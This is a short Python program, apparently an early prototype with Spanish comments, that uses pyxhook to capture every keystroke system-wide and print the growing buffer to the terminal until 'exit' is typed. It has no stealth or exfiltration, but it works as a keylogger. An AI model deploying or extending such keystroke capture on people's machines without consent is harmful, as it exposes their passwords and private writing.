import pyxhook
import time
import sys
import termios

class Keyloggerore:

    def __init__(self):
        self.buffer = "" # Registro de pulsaciones
        self.running = True

    ### Funcion (MODIFICADA) de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
    # This function is called every time a key is presssed
    def callback(self,event):
        global running, buffers
        
        if hasattr(event, 'Key'): # se toma event.Key (los otros son: event.KeyID, event.Ascii)
            self.buffer += event.Key
            
        # print key info
        print(" => Evento: " + event.Key) # ELIMINAR DESPUES
        print("BUFFER: \n" + self.buffer + "\n")

        # If the "string" value matches spacebar, terminate the while loop
        if "exit" in self.buffer.lower():
    
            print("\n[x] Se detecto 'exit'. Finalizando keylogger.")
            termios.tcflush(sys.stdin, termios.TCIFLUSH) # Limpiar terminal
            # Mientras se ejecuta el programa tambien se registran las 
            # pulsaciones en la misma terminal, las cuales forman una cola 
            # de teclas que esperan su turno para ser procesadas
            running = False
            self.buffer = ""
        
if __name__ == "__main__":

    print("============= Keylogger iniciado. =============")
    logger = Keyloggerore()
    
    try:
        ### codigo tomado de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
        # Create hookmanager
        hookman = pyxhook.HookManager()
        # Define our callback to fire when a key is pressed down
        hookman.KeyDown = logger.callback
        # Hook the keyboard
        hookman.HookKeyboard()
        # Start our listener
        hookman.start()

        # Create a loop to keep the application running
        running = True
        while running:
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        print("\n[x] Programa interrumpido por Ctrl+C.")
        running = False
        buffer = ""

    # Close the listener when we are done
    hookman.cancel()
    ### fin de example.py
    
    print("============= Keylogger detenido. =============")
    
    
    

        
        
    

